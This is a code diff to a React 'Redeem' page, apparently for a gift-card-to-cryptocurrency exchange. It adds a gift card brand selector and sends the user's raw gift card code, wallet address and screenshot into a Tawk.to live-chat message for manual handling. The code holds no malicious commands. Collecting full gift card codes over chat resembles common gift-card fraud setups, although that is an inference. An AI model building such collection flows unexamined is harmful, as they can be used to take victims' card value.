@@ -51,8 +51,28 @@ const walletValidators: Record<string, { pattern: RegExp; example: string; descr
   }
 };
 
+const giftCardTypes: Record<string, string> = {
+  amazon: "Amazon",
+  itunes: "iTunes / Apple",
+  googleplay: "Google Play",
+  steam: "Steam",
+  ebay: "eBay",
+  walmart: "Walmart",
+  target: "Target",
+  visa: "Visa Prepaid",
+  mastercard: "Mastercard Prepaid",
+  amex: "American Express",
+  netflix: "Netflix",
+  spotify: "Spotify",
+  playstation: "PlayStation",
+  xbox: "Xbox",
+  razer: "Razer Gold",
+  other: "Other",
+};
+
 const Redeem = () => {
   const [giftCardCode, setGiftCardCode] = useState("");
+  const [giftCardType, setGiftCardType] = useState("");
   const [walletAddress, setWalletAddress] = useState("");
   const [selectedCrypto, setSelectedCrypto] = useState("");
   const [screenshot, setScreenshot] = useState<File | null>(null);
@@ -147,7 +167,7 @@ const Redeem = () => {
   const handleRedeem = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!giftCardCode || !walletAddress || !selectedCrypto) {
+    if (!giftCardCode || !giftCardType || !walletAddress || !selectedCrypto) {
       toast.error("Please fill in all fields");
       return;
     }
@@ -175,6 +195,7 @@ const Redeem = () => {
     // Prepare redemption message for Tawk.to with image URL
     const redemptionMessage = `🎁 NEW GIFT CARD REDEMPTION REQUEST
 
+Gift Card Type: ${giftCardTypes[giftCardType] || giftCardType}
 Gift Card Code: ${giftCardCode}
 Cryptocurrency: ${cryptoNames[selectedCrypto] || selectedCrypto}
 Wallet Address: ${walletAddress}
@@ -187,6 +208,7 @@ Please process this redemption request.`;
       // Add event for tracking
       if (window.Tawk_API.addEvent) {
         window.Tawk_API.addEvent('gift_card_redemption', {
+          giftCardType: giftCardType,
           giftCardCode: giftCardCode,
           crypto: selectedCrypto,
           walletAddress: walletAddress,
@@ -211,6 +233,7 @@ Please process this redemption request.`;
       setTimeout(() => {
         toast.success("Your redemption request has been sent to our support team. Please check the chat window.");
         setGiftCardCode("");
+        setGiftCardType("");
         setWalletAddress("");
         setSelectedCrypto("");
         setScreenshot(null);
@@ -241,6 +264,20 @@ Please process this redemption request.`;
 
         <Card className="border-border bg-card p-6">
           <form onSubmit={handleRedeem} className="space-y-6">
+            <div className="space-y-2">
+              <Label htmlFor="giftcardtype">Gift Card Type</Label>
+              <Select value={giftCardType} onValueChange={setGiftCardType}>
+                <SelectTrigger id="giftcardtype" className="bg-background">
+                  <SelectValue placeholder="Select gift card type" />
+                </SelectTrigger>
+                <SelectContent className="bg-popover">
+                  {Object.entries(giftCardTypes).map(([key, name]) => (
+                    <SelectItem key={key} value={key}>{name}</SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            </div>
+
             <div className="space-y-2">
               <Label htmlFor="giftcard">Gift Card Code</Label>
               <Input
